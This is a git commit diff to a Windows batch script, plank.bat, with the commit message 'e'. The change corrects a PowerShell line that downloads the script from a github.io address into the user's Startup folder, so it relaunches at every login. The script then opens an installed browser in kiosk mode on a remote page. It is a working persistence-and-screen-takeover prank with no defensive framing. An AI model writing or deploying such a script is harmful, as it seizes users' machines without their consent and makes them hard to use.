c5275291ec8d46fc90d75122d8e742a49dd03c85
giggityfiles <giggityfiles@gmail.com>
2025-10-17 22:29:45 -0400

    e

--- plank.bat
+++ plank.bat
@@ -3,24 +3,22 @@ set "programdta=C:\ProgramData"
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "URL=https://cmd-hue.github.io/plank/"
 
-
-
-powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%startup%'"
+powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%startup%\plank.bat'"
 
 where chrome >nul 2>nul
-if %ERRORLEVEL%==0 (
+if not errorlevel 1 (
     start chrome --kiosk "%URL%"
     exit
 )
 
 where msedge >nul 2>nul
-if %ERRORLEVEL%==0 (
+if not errorlevel 1 (
     start msedge --kiosk "%URL%"
     exit
 )
 
 where firefox >nul 2>nul
-if %ERRORLEVEL%==0 (
+if not errorlevel 1 (
     start firefox -kiosk "%URL%"
     exit
 )
